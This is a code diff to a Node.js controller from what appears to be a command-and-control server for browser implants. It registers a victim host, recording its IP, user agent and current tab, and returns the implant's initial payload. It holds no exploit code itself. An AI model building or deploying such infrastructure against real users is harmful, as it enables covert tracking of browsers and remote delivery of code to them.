@@ -1,17 +1,34 @@
 const Host = require("../models/Host");
+const Implant = require("../models/Implant");
 const { getPayloadByName } = require("./payloadControllers");
 
 module.exports.registerHost = async (req, res) => {
-    try {
-        const host = await Host.create(req.body);
-        res.status(200).json({
-            id: host._id.toString(),
-        });
-    } catch (err) {
-        res.status(400).json({
-            status: "fail",
-            message: err.message
-        });
+    if(req.body.associatedImplant !== undefined){
+        try {
+            const implant = await Implant.findById(req.body.associatedImplant);
+            if(implant){
+                Host.create({
+                        externalIP: req.body.externalIP,
+                        userAgent: req.body.userAgent,
+                        currentTab: req.body.currentTab,
+                        associatedImplant: req.body.associatedImplant
+                    }).then((host) => {
+                        res.status(200).json({
+                            id: host._id.toString(),
+                            initialPayload: implant.initialPayload
+                        });
+                    }).catch((err) => {
+                        res.status(400).json(err);
+                    });
+            } else {
+                res.status(400).json({message: "Implant not found"});
+            }
+        } catch (err) {
+            res.status(400).json({
+                status: "fail",
+                message: err.message
+            });
+        }
     }
 };
 
